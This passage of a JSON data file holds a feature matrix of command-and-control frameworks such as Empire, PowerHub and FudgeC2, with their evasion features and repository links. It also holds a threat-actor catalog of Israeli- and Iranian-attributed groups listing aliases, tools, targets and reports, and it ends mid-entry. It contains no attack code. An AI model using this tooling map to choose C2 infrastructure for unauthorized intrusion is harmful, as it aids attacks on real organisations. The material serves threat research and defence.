"DoH": "No", "Jitter": "No", "How-To": "", "ATT&CK Mapping": "No", "Kali": "Yes", "Twitter": "", "MAPI": "No", "Site": "", "Agent": "Python", "API": "No", "UI": "GUI", "Linux": "Yes", "GH Issues": "89"}, "ibombshell": {"HTTP": "Yes", "Implementation": "pip3", "DomainFront": "No", "Multi-User": "No", "SMB": "", "Kill Date": "No", "macOS": "Yes", "GitHub": "https://github.com/ElevenPaths/ibombshell", "Key Exchange": "None", "Chaining": "No", "Price": "NA", "TCP": "No", "Proxy Aware": "Yes", "HTTP3": "No", "HTTP2": "No", "Date": "11/12/2019", "Evaluator": "@jorgeorchilles", "Working Hours": "No", "Slack": "No", "FTP": "No", "Version Reviewed": "0.0.3b", "Logging": "No", "Name": "ibombshell", "License": "GNU GPL3", "Windows": "Yes", "Stego": "No", "Notes": "Works anywhere PowerShell does; GET requests", "Server": "Python", "Actively Maint.": "Yes", "Dashboard": "No", "DNS": "No", "Custom Profile": "No", "ICMP": "No", "Slack Members": "NA", "IMAP": "No", "DoH": "Yes", "Jitter": "No", "How-To": "", "ATT&CK Mapping": "No", "Kali": "Yes", "Twitter": "", "MAPI": "No", "Site": "", "Agent": "PowerShell", "API": "No", "UI": "GUI", "Linux": "Yes", "GH Issues": "5"}, "Prismatica": {"HTTP": "Yes", "Implementation": "Docker", "DomainFront": "No", "Multi-User": "Yes", "SMB": "", "Kill Date": "No", "macOS": "Yes", "GitHub": "https://github.com/Project-Prismatica", "Key Exchange": "None", "Chaining": "Yes", "Price": "NA", "TCP": "Yes", "Proxy Aware": "Yes", "HTTP3": "No", "HTTP2": "No", "Date": "11/13/2019", "Evaluator": "@0sm0s1z", "Working Hours": "No", "Slack": "No", "FTP": "No", "Version Reviewed": "0.01", "Logging": "Yes", "Name": "Prismatica", "License": "MIT", "Windows": "Yes", "Stego": "No", "Notes": "A few issues came up when poking this. Prismatica is a marketplace and not a c2 in and of itself. Prismatica has multliple c2 applications that can be used, but I haven't been able to get them working. Git merge errors and sparse/incomplete instructions have made getting accurate information about this c2 cumbersome.", "Server": "Javascript/Python", "Actively Maint.": "Yes", "Dashboard": "Yes", "DNS": "No", "Custom Profile": "Yes", "ICMP": "No", "Slack Members": "NA", "IMAP": "No", "DoH": "No", "Jitter": "Yes", "How-To": "", "ATT&CK Mapping": "No", "Kali": "", "Twitter": "@PPrismatica", "MAPI": "No", "Site": "http://prismatica.io/", "Agent": "JScript/.NET/Rust", "API": "Yes", "UI": "GUI", "Linux": "Yes", "GH Issues": "1"}, "FudgeC2": {"HTTP": "Yes", "Implementation": "pip3", "DomainFront": "No", "Multi-User": "Yes", "SMB": "No", "Kill Date": "Yes", "macOS": "No", "GitHub": "https://github.com/Ziconius/FudgeC2", "Key Exchange": "None", "Chaining": "No", "Price": "NA", "TCP": "No", "Proxy Aware": "No", "HTTP3": "No", "HTTP2": "No", "Date": "2/11/2020", "Evaluator": "@jorgeorchilles", "Working Hours": "No", "Slack": "No", "FTP": "No", "Version Reviewed": "Beta", "Logging": "No", "Name": "FudgeC2", "License": "GNU GPL3", "Windows": "Yes", "Stego": "No", "Notes": "Opened bug as implant creation error.", "Server": "Python", "Actively Maint.": "Yes", "Dashboard": "Yes", "DNS": "No", "Custom Profile": "Yes", "ICMP": "No", "Slack Members": "NA", "IMAP": "No", "DoH": "No", "Jitter": "No", "How-To": "https://github.com/Ziconius/FudgeC2/wiki", "ATT&CK Mapping": "No", "Kali": "Yes", "Twitter": "@Ziconius", "MAPI": "No", "Site": "", "Agent": "Powershell", "API": "No", "UI": "Web", "Linux": "No", "GH Issues": "3"}, "Faction C2": {"HTTP": "Yes", "Implementation": "install.sh", "DomainFront": "No", "Multi-User": "Yes", "SMB": "", "Kill Date": "Yes", "macOS": "No", "GitHub": "https://github.com/FactionC2/", "Key Exchange": "TLS", "Chaining": "No", "Price": "NA", "TCP": "Yes", "Proxy Aware": "Yes", "HTTP3": "No", "HTTP2": "No", "Date": "10/30/2019", "Evaluator": "@jorgeorchilles", "Working Hours": "No", "Slack": "#factionc2 bloodhoundgang.herokuapp.com", "FTP": "No", "Version Reviewed": "NA", "Logging": "Yes", "Name": "Faction C2", "License": "BSD3", "Windows": "Yes", "Stego": "No", "Notes": "Ubuntu only", "Server": ".NET", "Actively Maint.": "Yes", "Dashboard": "Yes", "DNS": "No", "Custom Profile": "Yes", "ICMP": "No", "Slack Members": "203", "IMAP": "No", "DoH": "No", "Jitter": "Yes", "How-To": "", "ATT&CK Mapping": "No", "Kali": "Yes", "Twitter": "", "MAPI": "No", "Site": "https://www.factionc2.com/", "Agent": ".NET", "API": "Yes", "UI": "Web", "Linux": "No", "GH Issues": "38"}, "MacShellSwift": {"HTTP": "Yes", "Implementation": "python", "DomainFront": "No", "Multi-User": "No", "SMB": "", "Kill Date": "No", "macOS": "Yes", "GitHub": "https://github.com/cedowens/MacShellSwift", "Key Exchange": "TLS", "Chaining": "No", "Price": "NA", "TCP": "No", "Proxy Aware": "No", "HTTP3": "No", "HTTP2": "No", "Date": "11/13/2019", "Evaluator": "@Adam_Mashinchi", "Working Hours": "No", "Slack": "No", "FTP": "No", "Version Reviewed": "N/A", "Logging": "No", "Name": "MacShellSwift", "License": "NA", "Windows": "No", "Stego": "No", "Notes": "", "Server": "Python", "Actively Maint.": "Yes", "Dashboard": "No", "DNS": "No", "Custom Profile": "No", "ICMP": "No", "Slack Members": "NA", "IMAP": "No", "DoH": "No", "Jitter": "No", "How-To": "", "ATT&CK Mapping": "No", "Kali": "", "Twitter": "@cedowens", "MAPI": "No", "Site": "No", "Agent": "Swift", "API": "No", "UI": "CLI", "Linux": "No", "GH Issues": "0"}, "Red Team Toolkit": {"HTTP": "Yes", "Implementation": "install.sh", "DomainFront": "Yes", "Multi-User": "No", "SMB": "Yes", "Kill Date": "No", "macOS": "No", "GitHub": "", "Key Exchange": "Encrypted Key Exchange", "Chaining": "Yes", "Price": "$7,000", "TCP": "No", "Proxy Aware": "Yes", "HTTP3": "No", "HTTP2": "No", "Date": "11/22/2019", "Evaluator": "@dmay3r", "Working Hours": "No", "Slack": "No", "FTP": "No", "Version Reviewed": "2.63", "Logging": "Yes", "Name": "Red Team Toolkit", "License": "Commercial", "Windows": "Yes", "Stego": "No", "Notes": "", "Server": "Python", "Actively Maint.": "Yes", "Dashboard": "No", "DNS": "No", "Custom Profile": "Yes", "ICMP": "No", "Slack Members": "NA", "IMAP": "No", "DoH": "No", "Jitter": "No", "How-To": "", "ATT&CK Mapping": "No", "Kali": "", "Twitter": "@SilentBreakSec", "MAPI": "No", "Site": "https://silentbreaksecurity.com/red-team-toolkit/slingshot/", "Agent": "C++", "API": "No", "UI": "CLI", "Linux": "No", "GH Issues": "NA"}, "PowerHub": {"HTTP": "Yes", "Implementation": "pip3", "DomainFront": "No", "Multi-User": "Yes", "SMB": "", "Kill Date": "No", "macOS": "No", "GitHub": "https://github.com/AdrianVollmer/PowerHub", "Key Exchange": "TLS", "Chaining": "No", "Price": "NA", "TCP": "No", "Proxy Aware": "Yes", "HTTP3": "No", "HTTP2": "No", "Date": "11/15/2019", "Evaluator": "@jorgeorchilles", "Working Hours": "No", "Slack": "No", "FTP": "No", "Version Reviewed": "1.3", "Logging": "Yes", "Name": "PowerHub", "License": "MIT", "Windows": "Yes", "Stego": "No", "Notes": "", "Server": "Python", "Actively Maint.": "Yes", "Dashboard": "No", "DNS": "No", "Custom Profile": "No", "ICMP": "No", "Slack Members": "NA", "IMAP": "No", "DoH": "No", "Jitter": "No", "How-To": "https://github.com/AdrianVollmer/PowerHub/wiki", "ATT&CK Mapping": "No", "Kali": "Yes", "Twitter": "@mr_mitm", "MAPI": "No", "Site": "", "Agent": "PowerShell", "API": "No", "UI": "Web", "Linux": "No", "GH Issues": "38"}, "Empire": {"HTTP": "Yes", "Implementation": "install.sh", "DomainFront": "Yes", "Multi-User": "Yes", "SMB": "", "Kill Date": "Yes", "macOS": "Yes", "GitHub": "https://github.com/BC-SECURITY/Empire", "Key Exchange": "Encrypted Key Exchange", "Chaining": "No", "Price": "NA", "TCP": "No", "Proxy Aware": "Yes", "HTTP3": "No", "HTTP2": "No", "Date": "1/30/2020", "Evaluator": "@jorgeorchilles", "Working Hours": "Yes", "Slack": "#psempire bloodhoundgang.herokuapp.com", "FTP": "No", "Version Reviewed": "3.0.5", "Logging": "Yes", "Name": "Empire", "License": "BSD3", "Windows": "Yes", "Stego": "No", "Notes": "", "Server": "Python", "Actively Maint.": "Yes", "Dashboard": "No", "DNS": "No", "Custom Profile": "Yes", "ICMP": "No", "Slack Members": "1299", "IMAP": "No", "DoH": "No", "Jitter": "Yes", "How-To": "", "ATT&CK Mapping": "No", "Kali": "Yes", "Twitter": "@BCSecurity1", "MAPI": "No", "Site": "", "Agent": "PowerShell", "API": "Yes", "UI": "Web", "Linux": "Yes", "GH Issues": "61"}}, "actors": [{"israel": {"actors": [{"operations": ["Olympic Games / Stuxnet"], "comment": null, "attck_id": null, "names": ["Unit 8200"], "links": ["https://archive.org/details/Stuxnet", "http://www.langner.com/en/wp-content/uploads/2013/11/To-kill-a-centrifuge.pdf "], "tools": ["Stuxnet"], "targets": "Directed at Iranian nuclear facilities", "description": "Stuxnet is typically introduced to the target environment via an infected USB flash drive."}, {"operations": ["Duqu 2.0"], "comment": null, "attck_id": null, "names": ["Duqu Group", "Unit 8200"], "links": ["https://blog.crysys.hu/2018/03/territorial-dispute-nsas-perspective-on-apt-landscape/", "https://securelist.com/files/2015/06/The_Mystery_of_Duqu_2_0_a_sophisticated_cyberespionage_actor_returns.pdf", "https://securelist.com/blog/research/70504/the-mystery-of-duqu-2-0-a-sophisticated-cyberespionage-actor-returns/", "http://www.wsj.com/articles/spy-virus-linked-to-israel-targeted-hotels-used-for-iran-nuclear-talks-1433937601"], "tools": ["Duqu"], "targets": "A threat actor, using a tool dubbed Duqu 2.0, targeted individuals and companies linked to the P5+1 (the five permanent member states of the UN Security Council, plus Germany), which was conducting negotiations on Iran's nuclear program. ", "description": null}, {"operations": [], "comment": "Might be related to Duqu, Stuxnetand might attributed to Israel.", "attck_id": null, "names": ["Flowershop", "Cheshire Cat", "MoonFlower", "SunFlower"], "links": ["https://blog.crysys.hu/2018/03/territorial-dispute-nsas-perspective-on-apt-landscape/", "https://malware-research.org/prepare-father-of-stuxnet-news-are-coming/", "https://blog.crysys.hu/2018/03/territorial-dispute-nsas-perspective-on-apt-landscape/", "https://github.com/Yara-Rules/rules/blob/master/malware/APT_CheshireCat.yar"], "tools": [], "targets": null, "description": null}]}}, null, {"iran": {"actors": [{"operations": ["Cleaver"], "comment": "COBALT GYPSY overlap with OilRig", "attck_id": "G0059", "names": ["COBALT GYPSY", "Ghambar", "TG-2889", "Cutting Kitten", "Cutting Kitten"], "links": ["https://cdn2.hubspot.net/hubfs/270968/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf", "https://www.secureworks.com/research/the-curious-case-of-mia-ash", "http://www.secureworks.com/cyber-threat-intelligence/threats/suspected-iran-based-hacker-group-creates-network-of-fake-linkedin-profiles/"], "tools": ["TinyZBot", "PupyRAT"], "targets": "This threat actor targets governments and private sector entities for espionage and sabotage purposes. It is believed to be responsible for compromising U.S. Navy computers at the Navy Marine Corps Intranet in San Diego, the U.S. energy company Calpine Corporation, Saudi Aramco, Pemex, Qatar Airways, and Korean Air", "description": null}, {"operations": [], "comment": null, "attck_id": "S0140", "names": ["Shamoon", "Volatile Kitten"], "links": ["http://www.nytimes.com/2012/10/24/business/global/cyberattack-on-saudi-oil-firm-disquiets-us.html", "https://en.wikipedia.org/wiki/Shamoon"], "tools": ["Shamoon / Disttrack"], "targets": "This threat actor targets energy sector, oil and gas industry as well as transportation and telecommunication services.", "description": "wiper"}, {"operations": [], "comment": null, "attck_id": null, "names": ["Group 41", "Clever Kitten", "Clever Kitten"], "links": ["http://www.crowdstrike.com/blog/whois-clever-kitten/"], "tools": ["Acunetix Web Vulnerability Scanner", "PHP Webshell RC SHELL"], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Madi"], "links": ["https://securelist.com/blog/incidents/33701/the-madi-campaign-part-ii-53/", "https://securelist.com/blog/incidents/33693/the-madi-campaign-part-i-5/"], "tools": [], "targets": "This threat actor compromises engineering firms, government entities, and financial and academic institutions in the United States, Israel, Iran, and Pakistan", "description": "Social engineering"}, {"operations": ["Ababil / ApAbabil"], "comment": null, "attck_id": null, "names": ["Fraternal Jackal", "Cyber fighters of Izz Ad-Din Al Qassam"], "links": ["https://www.washingtonpost.com/world/national-security/iran-blamed-for-cyberattacks/2012/09/21/afbe2be4-0412-11e2-9b24-ff730c7f6312_story.html", "http://ddanchev.blogspot.com.es/2012/09/dissecting-operation-ababil-osint.html", "http://www.nytimes.com/2013/01/09/technology/online-banking-attacks-were-work-of-iran-us-officials-say.html", "http://pastebin.com/u/QassamCyberFighters"], "tools": [], "targets": "The websites of Bank of America, JPMorgan Chase, Wells Fargo, and other U.S. financial institutions suffered simultaneous outages due to a coordinated denial of service cyberattack in September 2012. Attackers flooded bank servers with junk traffic, preventing users from online banking. An Iranian group called Izz ad-Din al-Qassam Cyber Fighters initially claimed responsibility for the incident. At the time, the media reported that U.S. intelligence believed the denial of service was in response to U.S. imposed economic sanctions to counter Iran's nuclear program. Seven Iranian individuals linked to the Islamic Revolutionary Guard Corps were eventually indicted by the U.S. Department of Justice in 2016 for their involvement in the incident.", "description": "DoS"}, {"operations": [], "comment": "Uses the same C2 infrastructure as OilRig", "attck_id": "G0087", "names": ["ITG07", "Cadelle", "APT39", "Chafer", "Remix Kitten"], "links": ["https://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-november-helix-kitten/", "https://unit42.paloaltonetworks.com/new-python-based-payload-mechaflounder-used-by-chafer/", "https://www.fireeye.com/blog/threat-research/2019/01/apt39-iranian-cyber-espionage-group-focused-on-personal-information.html", "https://securelist.com/chafer-used-remexi-malware/89538/", "https://www.symantec.com/blogs/threat-intelligence/chafer-latest-attacks-reveal-heightened-ambitions", "http://www.symantec.com/connect/blogs/iran-based-attackers-use-back-door-threats-spy-middle-eastern-targets", "http://www.symantec.com/connect/blogs/iran-based-attackers-use-back-door-threats-spy-middle-eastern-targets", "https://securityintelligence.com/posts/observations-of-itg07-cyber-operations/"], "tools": ["Remexi", "PsExec", "Mimikatz", "Web Shells (aspx spy", "b374k)", "nbtscan", "plink", "RemCom", "VNC Bypass scanner", "CoreSecurity tools", "Impacket / Python exploits", "NSSM", "Remcom", "HTTPTunnel", "Cadelspy", "PLink", "SSH Tunnels to Windows Servers"], "targets": "Airlines, Airports, Transportation, Logistics - worldwide", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Prince of Persia"], "links": ["https://researchcenter.paloaltonetworks.com/2016/06/unit42-prince-of-persia-game-over/", "http://researchcenter.paloaltonetworks.com/2016/05/prince-of-persia-infy-malware-active-in-decade-of-targeted-attacks/", "https://researchcenter.paloaltonetworks.com/2017/08/unit42-prince-persia-ride-lightning-infy-returns-foudre/", "https://iranthreats.github.io/"], "tools": ["Infy"], "targets": "This threat actor targets governments and businesses of multiple countries, including the United States, Israel, and Denmark.", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Sima"], "links": ["https://iranthreats.github.io/"], "tools": [], "targets": "focus on dissidents, woman rights activists, human rights organizations ", "description": null}, {"operations": [], "comment": "Uses the same C2 infrastructure as Chafer - which caused a major mixup of OilRig campaigns falsely attributed to Chafer. Also note that Turla used OilRigs implants", "attck_id": "G0049", "names": ["Crambus", "Twisted Kitten", "COBALT GYPSY", "APT34", "Chrysene", "ITG13", "Oilrig", "Helix Kitten"], "links": ["https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html", "https://researchcenter.paloaltonetworks.com/2017/12/unit42-introducing-the-adversary-playbook-first-up-oilrig/", "https://www.ncsc.gov.uk/news/turla-group-exploits-iran-apt-to-expand-coverage-of-victims", "https://researchcenter.paloaltonetworks.com/2017/09/unit42-striking-oil-closer-look-adversary-infrastructure/", "https://securityintelligence.com/posts/new-destructive-wiper-zerocleare-targets-energy-sector-in-the-middle-east/", "https://www.clearskysec.com/powdesk-apt34/", "http://researchcenter.paloaltonetworks.com/2017/04/unit42-oilrig-actors-provide-glimpse-development-testing-efforts/", "http://blog.morphisec.com/iranian-fileless-cyberattack-on-israel-word-vulnerability%20", "http://www.clearskysec.com/oilrig/", "https://cert.gov.il/Updates/Alerts/SiteAssets/CERT-IL-ALERT-W-120.pdf", "http://researchcenter.paloaltonetworks.com/2016/10/unit42-oilrig-malware-campaign-updates-toolset-and-expands-targets/", "http://researchcenter.paloaltonetworks.com/2016/05/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/", "https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.html", "https://www.forbes.com/sites/thomasbrewster/2017/02/15/oilrig-iran-hackers-cyberespionage-us-turkey-saudi-arabia/#56749aa2468a", "https://researchcenter.paloaltonetworks.com/2017/07/unit42-twoface-webshell-persistent-access-point-lateral-movement/", "https://www.dragos.com/blog/20180517Chrysene.html", "https://www.fireeye.com/content/dam/collateral/en/mtrends-2018.pdf", "https://sec0wn.blogspot.com/2018/05/prb-backdoor-fully-loaded-powershell.html", "https://researchcenter.paloaltonetworks.com/2017/07/unit42-oilrig-uses-ismdoor-variant-possibly-linked-greenbug-threat-group/"], "tools": ["Helminth", "ISMDoor", "Clayslide", "QUADAGENT", "OopsIE", "ALMA Communicator", "customized Mimikatz", "Invoke-Obfuscation", "POWBAT", "POWRUNER (PS Backdoor)", "BONDUPDATER", "malicious RTF files CVE-2017-0199 and CVE-2017-11882", "ELVENDOOR", "PLink", "PsExec", "SSH Tunnels to Windows Servers", "Webshells (TwoFace", "DarkSeaGreenShell", "LittleFace)", "PowDesk"], "targets": null, "description": null}, {"operations": ["Wilted Tulip"], "comment": "DarkHydrus C2 Infra Overlap", "attck_id": "G0052", "names": ["LazyMeerkat", "DarkHydrus", "Slayer Kitten", "CopyKittens"], "links": ["http://www.clearskysec.com/tulip/", "https://researchcenter.paloaltonetworks.com/2018/07/unit42-new-threat-actor-group-darkhydrus-targets-middle-east-government/", "https://blog.domaintools.com/2017/03/hunt-case-study-hunting-campaign-indicators-on-privacy-protected-attack-infrastructure/", "http://www.clearskysec.com/copykitten-jpost/", "https://s3-eu-west-1.amazonaws.com/minervaresearchpublic/CopyKittens/CopyKittens.pdf"], "tools": ["TDTESS backdoor", "Vminst", "NetSrv", "Cobalt Strike", "ZPP", "Matryoshka v1 and Matryoshka v2"], "targets": "Israel\u2019s Ministry of Foreign Affairs and some well-known Israeli academic researchers specializing in Middle East Studies. Israel, Saudi Arabia, United States, Jordan, Germany", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["NEWSCASTER", "iKittens", "Parastoo", "APT35", "Phosphorus", "NewsBeef", "Group 83", "Charming Kitten", "Charming Kitten"], "links": ["https://securelist.com/twas-the-night-before/91599/", "https://www.clearskysec.com/wp-content/uploads/2019/09/The-Kittens-Are-Back-in-Town-Charming-Kitten-2019.pdf", "https://noticeofpleadings.com/phosphorus/files/Sealing.pdf?fbclid=IwAR1HMnynb0AaGyCI-8ejHjH-pNORfuHYOzQdsTrSpin2eRww6rRh-6VK2SI", "https://securelist.com/files/2017/03/Report_Shamoon_StoneDrill_final.pdf", "https://cryptome.org/2012/11/parastoo-hacks-iaea.htm", "https://www.verfassungsschutz.de/download/broschuere-2016-10-bfv-cyber-brief-2016-04.pdf", "https://securelist.com/blog/software/74503/freezer-paper-around-free-meat/", "https://www.isightpartners.com/2014/05/newscaster-iranian-threat-inside-social-media/", "https://github.com/gasgas4/APT_CyberCriminal_Campagin/tree/master/2014/2014.05.28.NewsCaster_An_Iranian_Threat_Within_Social_Networks", "https://iranthreats.github.io/resources/macdownloader-macos-malware/", "https://www.forbes.com/sites/thomasbrewster/2017/07/27/iran-hackers-oilrig-use-fake-personas-on-facebook-linkedin-for-cyberespionage/", "http://www.clearskysec.com/charmingkitten/", "https://blogs.microsoft.com/on-the-issues/2019/10/04/recent-cyberattacks-require-us-all-to-be-vigilant/", "https://www.clearskysec.com/the-kittens-are-back-in-town-2/", "https://www.fireeye.com/content/dam/collateral/en/mtrends-2018.pdf"], "tools": ["ALFA TEaM Shell", "DROPSHOT", "TURNEDUP", "SHAPESHIFT", "malicious HTA files", "MacDownloader"], "targets": "This threat actor uses watering hole attacks and fake profiles to lure targets from the U.S. government for espionage purposes.", "description": "Fake Social Media Account "}, {"operations": [], "comment": "Sub group of APT34 according to Mandiant", "attck_id": null, "names": ["Greenbug "], "links": ["https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2017/february/ism-rat/", "http://www.clearskysec.com/ismagent/", "https://researchcenter.paloaltonetworks.com/2017/07/unit42-oilrig-uses-ismdoor-variant-possibly-linked-greenbug-threat-group/", "https://www.arbornetworks.com/blog/asert/greenbugs-dns-isms/", "https://www.symantec.com/connect/blogs/greenbug-cyberespionage-group-targeting-middle-east-possible-links-shamoon"], "tools": ["ISMdoor"], "targets": "Saudi Arabia", "description": null}, {"operations": ["Stonedrill/ Shamoon2.0"], "comment": "possibly associated with Rocket Kitten and Cobalt Gypsy, Sandcat, use Recruitment themes", "attck_id": "G0059", "names": ["Elfin", "MAGNALLIUM", "Timberworm", "APT33", "Holmium", "Refined Kitten", "Magic Hound"], "links": ["https://go.recordedfuture.com/hubfs/reports/cta-2019-0626.pdf", "https://www.wired.com/story/iran-apt33-industrial-control-systems/", "https://www.securityweek.com/iranian-hackers-caused-losses-hundreds-millions-report", "https://webcache.googleusercontent.com/search?q=cache:Dicnr9-eKKYJ:https://securelist.com/files/2017/03/Report_Shamoon_StoneDrill_final.pdf+&cd=6&hl=en&ct=clnk&gl=ie", "https://gallery.logrhythm.com/threat-intelligence-reports/shamoon-2-malware-analysis-logrhythm-labs-threat-intelligence-report.pdf", "https://www.fireeye.com/current-threats/annual-threat-report/mtrends.html", "https://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/", "https://securityintelligence.com/the-full-shamoon-how-the-devastating-malware-was-inserted-into-networks/", "https://www.symantec.com/connect/blogs/shamoon-multi-staged-destructive-attacks-limited-specific-targets", "http://researchcenter.paloaltonetworks.com/2017/02/unit42-magic-hound-campaign-attacks-saudi-targets/", "https://blog.trendmicro.com/trendlabs-security-intelligence/more-than-a-dozen-obfuscated-apt33-botnets-used-for-extreme-narrow-targeting/", "https://www.fireeye.com/blog/threat-research/2018/12/overruled-containing-a-potentially-destructive-adversary.html", "https://blog.trendmicro.com/trendlabs-security-intelligence/more-than-a-dozen-obfuscated-apt33-botnets-used-for-extreme-narrow-targeting/", "https://www.symantec.com/blogs/threat-intelligence/elfin-apt33-espionage"], "tools": ["Shamoon", "POWERTON", "Ruler", "PUPYRAT", "POSHC2 (.NET backdoor)", "TURNEDUP", "AutoIt backdoor", "Gpppassword", "LaZagne", "Quasar RAT", "Remcos", "SniffPass", "DarkComet", "AutoIt FTP tool", ".NET FTP tool", "PowerShell downloader (registry.ps1)", "POSHC2 backdoor", "different keyloggers"], "targets": "A threat actor used malware known as Shamoon 2.0 to exfiltrate and delete data from computers in the Saudi transportation sector. Commercial entities, Middle East, US, South Korea, DND focussed entities, Airlines, Airline suppliers. ", "description": null}, {"operations": ["Woolen Goldfish", "Thamar Reservoir"], "comment": null, "attck_id": "G0059", "names": ["Saffron Rose", "TEMP.Beanie", "Flying Kitten", "Ajax Security Team", "Group 26", "Rocket Kitten", "Rocket Kitten"], "links": ["http://www.crowdstrike.com/blog/cat-scratch-fever-crowdstrike-tracks-newly-reported-iranian-actor-flying-kitten/", "https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2014/july/a-new-flying-kitten/", "https://citizenlab.org/2015/08/iran_two_factor_phishing/", "https://blog.checkpoint.com/wp-content/uploads/2015/11/rocket-kitten-report.pdf", "https://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-the-spy-kittens-are-back.pdf", "http://www.clearskysec.com/thamar-reservoir/", "https://www.trendmicro.com/vinfo/us/security/news/cyber-attacks/operation-woolen-goldfish-when-kittens-go-phishing", "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-operation-saffron-rose.pdf"], "tools": ["GHOLE / Core Impact", "CWoolger", "FireMalv", ".NETWoolger", "MPK", "Open source tools", "Puppy RAT", "MagicHound.Leash (IRC Bot)"], "targets": "Saudi Arabia, Israel, US, Iran, high ranking defense officials, embassies of various target countries, notable Iran researchers, human rights activists, media and journalists, academic institutions and various scholars, including scientists in the fields of physics and nuclear sciences. It seeks out material related to diplomacy, defense, security, journalism, and human rights for espionage purposes.", "description": null}, {"operations": ["Mermaid"], "comment": null, "attck_id": null, "names": ["?"], "links": ["https://ti.360.com/upload/report/file/mryxdgkb20160707en.pdf"], "tools": [], "targets": "This threat actor is based in the Middle East (possibly Iran) and targets English- and Persian-language organizations. It is alleged to be the same group behind a compromise of the Danish Ministry of Foreign Affairs.", "description": null}, {"operations": [], "comment": null, "attck_id": "G0059", "names": ["ITSecTeam"], "links": ["http://www.nytimes.com/2013/01/09/technology/online-banking-attacks-were-work-of-iran-us-officials-say.html", "https://www.washingtonpost.com/world/national-security/iran-blamed-for-cyberattacks/2012/09/21/afbe2be4-0412-11e2-9b24-ff730c7f6312_story.html", "http://pastebin.com/mCHia4W5"], "tools": [], "targets": "One of the threat actors responsible for the denial of service attacks against U.S in 2012/2013. Three individuals associated with the group believed to be have been working on behalf of Iran's Islamic Revolutionary Guard Corps were indicted by the Justice Department in 2016.", "description": null}, {"operations": ["BlackWater"], "comment": "Struggle with Kaspersky ", "attck_id": "G0069", "names": ["Cobalt Ulster", "Seedworm", "TEMP.Zagros", "SectorD02", "MuddyWater", "Static Kitten"], "links": ["https://documents.trendmicro.com/assets/white_papers/wp_new_muddywater_findings_uncovered.pdf", "https://www.clearskysec.com/wp-content/uploads/2019/06/Clearsky-Iranian-APT-group-%E2%80%98MuddyWater%E2%80%99-Adds-Exploits-to-Their-Arsenal.pdf", "https://blog.trendmicro.com/trendlabs-security-intelligence/muddywater-resurfaces-uses-multi-stage-backdoor-powerstats-v3-and-new-post-exploitation-tools/", "https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf", "https://sec0wn.blogspot.com/2018/02/burping-on-muddywater.html", "https://www.fireeye.com/blog/threat-research/2018/03/iranian-threat-group-updates-ttps-in-spear-phishing-campaign.html", "https://www.symantec.com/blogs/threat-intelligence/seedworm-espionage-group", "https://sec0wn.blogspot.co.il/2018/03/a-quick-dip-into-muddywaters-recent.html", "https://blog.trendmicro.com/trendlabs-security-intelligence/campaign-possibly-connected-muddywater-surfaces-middle-east-central-asia/", "https://researchcenter.paloaltonetworks.com/2017/11/unit42-muddying-the-water-targeted-attacks-in-the-middle-east/", "https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/", "https://threatrecon.nshc.net/2019/03/07/sectord02-powershell-backdoor-analysis/", "https://securelist.com/muddywaters-arsenal/90659/", "https://blog.prevailion.com/2020/01/summer-mirage.html", "https://www.secureworks.com/blog/business-as-usual-for-iranian-operations-despite-increased-tensions", "https://blog.talosintelligence.com/2019/05/recent-muddywater-associated-blackwater.html"], "tools": ["POWERSTATS", "PoweMuddy", "LaZagne", "Crackmapexec"], "targets": "individuals in Asia and the Middle East, government and defense entities in Central and Southwest Asia", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Cobalt Dickens", "TA407", "Silent Librarian", "Mabna Institute"], "links": ["https://www.secureworks.com/blog/cobalt-dickens-goes-back-to-school-again", "https://www.bleepingcomputer.com/news/security/iranian-hackers-create-credible-phishing-to-steal-library-access/", "https://www.secureworks.com/blog/back-to-school-cobalt-dickens-targets-universities", "https://www.proofpoint.com/us/threat-insight/post/seems-phishy-back-school-lures-target-university-students-and-staff", "https://info.phishlabs.com/blog/silent-librarian-more-to-the-story-of-the-iranian-mabna-institute-indictment", "https://twitter.com/ClearskySec/status/977899578346430464", "https://www.fbi.gov/wanted/cyber/iranian-mabna-hackers"], "tools": [], "targets": "144 universities in the United States, 176 foreign universities in 21 countries, five federal and state government agencies in the United States, 36 private companies in the United States, 11 foreign private companies, and two international non-governmental organizations", "description": null}, {"operations": [], "comment": null, "attck_id": "G0079", "names": ["DarkHydrus "], "links": ["https://docs.google.com/document/d/1oYX3uN6KxIX_StzTH0s0yFNNoHDnV8VgmVqU5WoeErc/edit#heading=h.ez428aw98bca", "https://researchcenter.paloaltonetworks.com/2018/07/unit42-new-threat-actor-group-darkhydrus-targets-middle-east-government/"], "tools": ["RogueRobin"], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Domestic Kitten", "Domestic Kitten"], "links": ["https://research.checkpoint.com/domestic-kitten-an-iranian-surveillance-operation/"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": "long-running SWC campaigns from December 2016 until public disclosure in July 2018", "attck_id": "G0077", "names": ["Leafminer", "Raspite", "Flash Kitten", "Flash Kitten"], "links": ["https://www.symantec.com/blogs/threat-intelligence/leafminer-espionage-middle-east", "https://www.dragos.com/blog/20180802Raspite.html", "https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/"], "tools": ["Sorgu", "guester / Trojan.Imecab"], "targets": "MENA Region", "description": null}, {"operations": [], "comment": "Criminal", "attck_id": null, "names": ["Boss Spider", "Gold lowell"], "links": ["https://garwarner.blogspot.com/2018/11/two-iranian-hackers-charged-with-6.html", 